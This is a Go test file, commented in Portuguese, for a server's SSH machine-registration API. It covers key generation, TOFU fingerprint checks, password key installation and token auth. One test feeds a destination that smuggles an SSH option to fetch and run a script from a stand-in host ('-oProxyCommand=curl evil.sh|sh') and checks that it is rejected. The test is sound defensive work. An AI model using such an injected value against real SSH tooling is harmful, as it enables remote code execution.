package server

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/vxfontes/cutuque/hub/internal/machine"
)

// fakeKeys substitui o machine.KeyStore nos testes: o de verdade roda
// ssh-keygen e ssh-keyscan (disco e rede), que não têm o que fazer aqui.
type fakeKeys struct {
	pub    string
	genErr error
	pubErr error
	// generated/removed registram as chamadas para os testes de rollback.
	generated []string
	removed   []string
	rmErr     error

	// scanFPs dá um fingerprint por chamada (a última se repete): é assim que
	// se simula a chave do host mudando entre o cadastro e a confirmação.
	scanFPs   []string
	scanLines string
	scanErr   error
	scanCalls int

	trusted  string
	trustErr error

	installErr   error
	installCalls int
	gotDest      string
	gotPort      int
	gotPassword  string
	gotPub       string
	gotFP        string
}

func newFakeKeys() *fakeKeys {
	return &fakeKeys{pub: "ssh-ed25519 AAAAFAKE cutuque-vps"}
}

func (f *fakeKeys) Generate(name string) (string, error) {
	f.generated = append(f.generated, name)
	if f.genErr != nil {
		return "", f.genErr
	}
	return f.pub, nil
}

func (f *fakeKeys) KeyPath(name string) (string, error) {
	return "/data/machines/keys/" + name, nil
}

func (f *fakeKeys) PublicKey(string) (string, error) {
	if f.pubErr != nil {
		return "", f.pubErr
	}
	return f.pub, nil
}

func (f *fakeKeys) RemoveKey(name string) error {
	f.removed = append(f.removed, name)
	return f.rmErr
}

func (f *fakeKeys) Scan(_ context.Context, dest string, _ int) (string, string, error) {
	f.scanCalls++
	if f.scanErr != nil {
		return "", "", f.scanErr
	}
	fp := "SHA256:padrao"
	if n := len(f.scanFPs); n > 0 {
		if f.scanCalls <= n {
			fp = f.scanFPs[f.scanCalls-1]
		} else {
			fp = f.scanFPs[n-1]
		}
	}
	lines := f.scanLines
	if lines == "" {
		lines = dest + " ssh-ed25519 AAAAHOST\n"
	}
	return lines, fp, nil
}

func (f *fakeKeys) Trust(lines string) error {
	if f.trustErr != nil {
		return f.trustErr
	}
	f.trusted += lines
	return nil
}

func (f *fakeKeys) InstallKey(_ context.Context, dest string, port int, password, pub, fp string) error {
	f.installCalls++
	f.gotDest, f.gotPort, f.gotPassword, f.gotPub, f.gotFP = dest, port, password, pub, fp
	return f.installErr
}

// doAdmin chama uma rota de cadastro com registro e KeyStore ligados.
func doAdmin(t *testing.T, mreg *machine.Registry, keys MachineKeys, method, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	rec := doAdminRaw(t, mreg, keys, method, path, body, true)
	return rec
}

func doAdminRaw(t *testing.T, mreg *machine.Registry, keys MachineKeys, method, path, body string, auth bool) *httptest.ResponseRecorder {
	t.Helper()
	cfg, reg := testDeps()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if auth {
		req.Header.Set("Authorization", "Bearer secret")
	}
	rec := httptest.NewRecorder()
	Router(cfg, reg, nil, WithMachines(mreg), WithMachineKeys(keys)).ServeHTTP(rec, req)
	return rec
}

// erroDe lê o código do corpo de erro ({"error": "..."}).
func erroDe(t *testing.T, rec *httptest.ResponseRecorder) string {
	t.Helper()
	var body struct {
		Error string `json:"error"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("corpo de erro não é json: %v — %s", err, rec.Body.String())
	}
	return body.Error
}

// MARK: POST /machines

func TestPostMachinesCadastraGeraChaveEDevolveAPublica(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doHost"}

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines",
		`{"name":"vps","dest":"vx@192.0.2.50","port":2222}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status %d, esperava 201: %s", rec.Code, rec.Body.String())
	}
	var got machineCreateResp
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatalf("json inválido: %v — %s", err, rec.Body.String())
	}
	if got.Machine.Name != "vps" || got.Machine.Dest != "vx@192.0.2.50" || got.Machine.Port != 2222 {
		t.Errorf("máquina errada: %+v", got.Machine)
	}
	if got.Machine.Source != machine.SourceApp {
		t.Errorf("origem = %q, esperava app", got.Machine.Source)
	}
	if got.PublicKey != keys.pub {
		t.Errorf("public_key = %q, esperava %q", got.PublicKey, keys.pub)
	}
	// O fingerprint vem para a usuária conferir — ainda NÃO está confiado.
	if got.Fingerprint != "SHA256:doHost" {
		t.Errorf("fingerprint = %q", got.Fingerprint)
	}
	if m, _ := mreg.Get("vps"); m.HostFingerprint != "" {
		t.Errorf("o cadastro já nasceu confiando no host sem a usuária confirmar: %q", m.HostFingerprint)
	}
	// A chave privada tem que ficar anotada no registro (o ssh -i precisa dela).
	if m, _ := mreg.Get("vps"); m.KeyPath != "/data/machines/keys/vps" {
		t.Errorf("key_path não foi gravado: %q", m.KeyPath)
	}
}

// O caminho e o conteúdo da chave privada nunca podem sair do macmini.
func TestPostMachinesNaoVazaAChavePrivada(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	rec := doAdmin(t, mreg, newFakeKeys(), http.MethodPost, "/machines",
		`{"name":"vps","dest":"vx@host"}`)
	corpo := rec.Body.String()
	for _, proibido := range []string{"key_path", "/data/machines/keys", "PRIVATE KEY"} {
		if strings.Contains(corpo, proibido) {
			t.Errorf("a resposta vaza %q: %s", proibido, corpo)
		}
	}
}

// Sem porta, 22 — o app não obriga a digitar.
func TestPostMachinesSemPortaUsa22(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	doAdmin(t, mreg, newFakeKeys(), http.MethodPost, "/machines", `{"name":"vps","dest":"vx@host"}`)
	if m, _ := mreg.Get("vps"); m.Port != 22 {
		t.Errorf("porta = %d, esperava 22", m.Port)
	}
}

func TestPostMachinesRecusaNomeJaUsado(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines", `{"name":"macbook","dest":"vx@outro"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "duplicate_name" {
		t.Errorf("erro = %q", got)
	}
	// Nome recusado não pode ter gerado chave nenhuma — nem sobrescrito a da
	// máquina do env que já tinha esse nome.
	if len(keys.generated) != 0 {
		t.Errorf("gerou chave para um nome recusado: %v", keys.generated)
	}
}

// Nome vira nome de arquivo da chave e segmento de rota: "../fuga" tem que
// morrer no cadastro, antes de qualquer escrita.
func TestPostMachinesRecusaNomeInvalido(t *testing.T) {
	for _, nome := range []string{"../fuga", "a/b", "", "com espaço"} {
		mreg := machine.NewRegistry(nil)
		keys := newFakeKeys()
		body := `{"name":` + jsonStr(nome) + `,"dest":"vx@host"}`
		rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines", body)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("nome %q: status %d, esperava 400", nome, rec.Code)
		}
		if len(keys.generated) != 0 {
			t.Errorf("nome %q: gerou chave mesmo assim", nome)
		}
	}
}

func TestPostMachinesRecusaDestinoQueViraOpcaoDoSsh(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	rec := doAdmin(t, mreg, newFakeKeys(), http.MethodPost, "/machines",
		`{"name":"vps","dest":"-oProxyCommand=curl evil.sh|sh"}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
}

func TestPostMachinesCorpoQuebradoE400(t *testing.T) {
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), http.MethodPost, "/machines", `{oops`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400", rec.Code)
	}
}

// Host fora do ar: melhor não deixar cadastro pela metade. Sem fingerprint o
// hub se recusa a conectar, então o cadastro seria inútil e a usuária teria que
// apagá-lo na mão antes de tentar de novo.
func TestPostMachinesDesfazOCadastroSeOScanFalha(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	keys := newFakeKeys()
	keys.scanErr = errors.New("host não respondeu")

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines", `{"name":"vps","dest":"vx@host"}`)
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("status %d, esperava 502: %s", rec.Code, rec.Body.String())
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("o cadastro ficou pela metade no registro")
	}
	if len(keys.removed) != 1 || keys.removed[0] != "vps" {
		t.Errorf("a chave órfã não foi apagada: %v", keys.removed)
	}
}

func TestPostMachinesDesfazOCadastroSeOKeygenFalha(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	keys := newFakeKeys()
	keys.genErr = errors.New("ssh-keygen sumiu")

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines", `{"name":"vps","dest":"vx@host"}`)
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status %d, esperava 500: %s", rec.Code, rec.Body.String())
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("máquina sem chave ficou no registro")
	}
}

// Sem KeyStore o hub serve só a lista: nada de cadastrar. O mux responde 405
// porque /machines existe em GET.
func TestSemKeyStoreOCadastroNaoExiste(t *testing.T) {
	cfg, reg := testDeps()
	req := httptest.NewRequest(http.MethodPost, "/machines", strings.NewReader(`{"name":"vps","dest":"x@y"}`))
	req.Header.Set("Authorization", "Bearer secret")
	rec := httptest.NewRecorder()
	Router(cfg, reg, nil, WithMachines(machine.NewRegistry(nil))).ServeHTTP(rec, req)
	if rec.Code == http.StatusCreated {
		t.Fatalf("cadastrou sem KeyStore configurado: %s", rec.Body.String())
	}
}

// MARK: POST /machines/{n}/trust

// registroComVPS devolve um registro com a máquina "vps" já cadastrada pelo app.
func registroComVPS(t *testing.T) *machine.Registry {
	t.Helper()
	r := machine.NewRegistry(nil)
	if _, err := r.Add(machine.Machine{Name: "vps", Dest: "vx@192.0.2.50", Port: 2222}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	return r
}

func TestPostTrustGravaOKnownHostsEOFingerprint(t *testing.T) {
	mreg := registroComVPS(t)
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doHost"}

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/trust",
		`{"fingerprint":"SHA256:doHost"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(keys.trusted, "ssh-ed25519 AAAAHOST") {
		t.Errorf("a chave do host não foi para o known_hosts: %q", keys.trusted)
	}
	m, _ := mreg.Get("vps")
	if m.HostFingerprint != "SHA256:doHost" {
		t.Errorf("fingerprint no registro = %q", m.HostFingerprint)
	}
}

// O coração do TOFU: entre o cadastro e a confirmação, o hub escaneia de novo.
// Se a chave mudou nesse meio, quem responde não é quem a usuária conferiu.
func TestPostTrustRecusaSeAChaveDoHostMudouDepoisDoCadastro(t *testing.T) {
	mreg := registroComVPS(t)
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doAtacante"} // o app confirmou outra

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/trust",
		`{"fingerprint":"SHA256:queAUsuariaViu"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "fingerprint_mismatch" {
		t.Errorf("erro = %q", got)
	}
	// Nada pode ter sido confiado nem gravado.
	if keys.trusted != "" {
		t.Errorf("gravou no known_hosts mesmo com divergência: %q", keys.trusted)
	}
	if m, _ := mreg.Get("vps"); m.HostFingerprint != "" {
		t.Errorf("gravou o fingerprint mesmo com divergência: %q", m.HostFingerprint)
	}
	// A usuária precisa ver as duas chaves para entender o que houve.
	corpo := rec.Body.String()
	if !strings.Contains(corpo, "SHA256:doAtacante") || !strings.Contains(corpo, "SHA256:queAUsuariaViu") {
		t.Errorf("o erro não mostra as duas impressões digitais: %s", corpo)
	}
}

func TestPostTrustSemFingerprintE400(t *testing.T) {
	keys := newFakeKeys()
	rec := doAdmin(t, registroComVPS(t), keys, http.MethodPost, "/machines/vps/trust", `{}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400", rec.Code)
	}
	if keys.scanCalls != 0 {
		t.Error("foi na rede sem ter o que comparar")
	}
}

// Máquina do hub.env usa o ~/.ssh do próprio hub, não o known_hosts do cadastro.
func TestPostTrustDeMaquinaDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	rec := doAdmin(t, mreg, newFakeKeys(), http.MethodPost, "/machines/macbook/trust",
		`{"fingerprint":"SHA256:x"}`)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
}

func TestPostTrustDeMaquinaInexistenteE404(t *testing.T) {
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), http.MethodPost,
		"/machines/fantasma/trust", `{"fingerprint":"SHA256:x"}`)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, esperava 404", rec.Code)
	}
}

// MARK: POST /machines/{n}/install-key

func TestPostInstallKeyMandaASenhaEAPublicaParaODestino(t *testing.T) {
	mreg := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/install-key",
		`{"password":"senha-da-vanessa"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if keys.gotDest != "vx@192.0.2.50" || keys.gotPort != 2222 {
		t.Errorf("destino errado: %s:%d", keys.gotDest, keys.gotPort)
	}
	if keys.gotPassword != "senha-da-vanessa" || keys.gotPub != keys.pub {
		t.Errorf("senha/chave erradas: %q / %q", keys.gotPassword, keys.gotPub)
	}
	// A senha só viaja para o host cujo fingerprint foi confirmado.
	if keys.gotFP != "SHA256:confirmado" {
		t.Errorf("fingerprint esperado = %q", keys.gotFP)
	}
	// A senha é de uso único: não pode ter ficado no registro.
	if m, _ := mreg.Get("vps"); strings.Contains(m.Dest+m.KeyPath+m.HostFingerprint, "senha-da-vanessa") {
		t.Error("a senha ficou guardada no registro")
	}
}

// O teste que mais importa da fase: mandar a senha para um host que a usuária
// não confirmou é entregá-la a quem estiver no meio.
func TestPostInstallKeyNaoMandaASenhaAntesDoTOFU(t *testing.T) {
	mreg := registroComVPS(t) // sem SetFingerprint
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/install-key",
		`{"password":"senha-da-vanessa"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "not_trusted" {
		t.Errorf("erro = %q", got)
	}
	if keys.installCalls != 0 {
		t.Error("a senha foi enviada para um host não confirmado")
	}
}

func TestPostInstallKeySemSenhaNaoVaiNaRede(t *testing.T) {
	mreg := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/install-key", `{"password":""}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400", rec.Code)
	}
	if keys.installCalls != 0 {
		t.Error("tentou conectar com senha vazia")
	}
}

func TestPostInstallKeyFalhaDoDestinoVira502ComMotivo(t *testing.T) {
	mreg := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()
	keys.installErr = errors.New("não deu para autenticar em vx@192.0.2.50")

	rec := doAdmin(t, mreg, keys, http.MethodPost, "/machines/vps/install-key",
		`{"password":"errada"}`)
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("status %d, esperava 502: %s", rec.Code, rec.Body.String())
	}
	// Sem o motivo a usuária não sabe se errou a senha ou se o host caiu.
	if !strings.Contains(rec.Body.String(), "autenticar") {
		t.Errorf("o erro não diz o que houve: %s", rec.Body.String())
	}
	// E o motivo não pode devolver a senha de volta.
	if strings.Contains(rec.Body.String(), "errada") {
		t.Errorf("a senha apareceu na resposta: %s", rec.Body.String())
	}
}

// MARK: PATCH e DELETE

func TestPatchMachineAlteraODestino(t *testing.T) {
	mreg := registroComVPS(t)
	rec := doAdmin(t, mreg, newFakeKeys(), http.MethodPatch, "/machines/vps",
		`{"dest":"vx@192.0.2.99","port":22}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	m, _ := mreg.Get("vps")
	if m.Dest != "vx@192.0.2.99" || m.Port != 22 {
		t.Errorf("patch não pegou: %+v", m)
	}
}

func TestPatchMachineDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	rec := doAdmin(t, mreg, newFakeKeys(), http.MethodPatch, "/machines/macbook", `{"dest":"outro@host"}`)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "read_only" {
		t.Errorf("erro = %q", got)
	}
}

func TestDeleteMachineApagaRegistroEChave(t *testing.T) {
	mreg := registroComVPS(t)
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, http.MethodDelete, "/machines/vps", "")
	if rec.Code != http.StatusNoContent {
		t.Fatalf("status %d, esperava 204: %s", rec.Code, rec.Body.String())
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("a máquina continua no registro")
	}
	if len(keys.removed) != 1 || keys.removed[0] != "vps" {
		t.Errorf("a chave privada não foi apagada: %v", keys.removed)
	}
}

// Remover máquina do env não pode nem tocar na chave: ela nem é do cadastro.
func TestDeleteMachineDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, http.MethodDelete, "/machines/macbook", "")
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403", rec.Code)
	}
	if len(keys.removed) != 0 {
		t.Errorf("apagou chave de máquina do env: %v", keys.removed)
	}
	if _, ok := mreg.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu do registro")
	}
}

func TestDeleteMachineInexistenteE404(t *testing.T) {
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), http.MethodDelete, "/machines/fantasma", "")
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, esperava 404", rec.Code)
	}
}

// MARK: token

// Cadastrar máquina instala chave em host remoto: nenhuma dessas rotas pode
// ficar aberta como o board.
func TestRotasDeCadastroExigemToken(t *testing.T) {
	casos := []struct{ method, path, body string }{
		{http.MethodPost, "/machines", `{"name":"vps","dest":"x@y"}`},
		{http.MethodPatch, "/machines/vps", `{"dest":"x@y"}`},
		{http.MethodDelete, "/machines/vps", ""},
		{http.MethodPost, "/machines/vps/trust", `{"fingerprint":"SHA256:x"}`},
		{http.MethodPost, "/machines/vps/install-key", `{"password":"x"}`},
	}
	for _, c := range casos {
		keys := newFakeKeys()
		rec := doAdminRaw(t, registroComVPS(t), keys, c.method, c.path, c.body, false)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("%s %s: status %d, esperava 401", c.method, c.path, rec.Code)
		}
		if keys.installCalls != 0 || len(keys.generated) != 0 {
			t.Errorf("%s %s: agiu sem token", c.method, c.path)
		}
	}
}

// jsonStr escapa uma string para dentro de um corpo JSON montado à mão.
func jsonStr(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
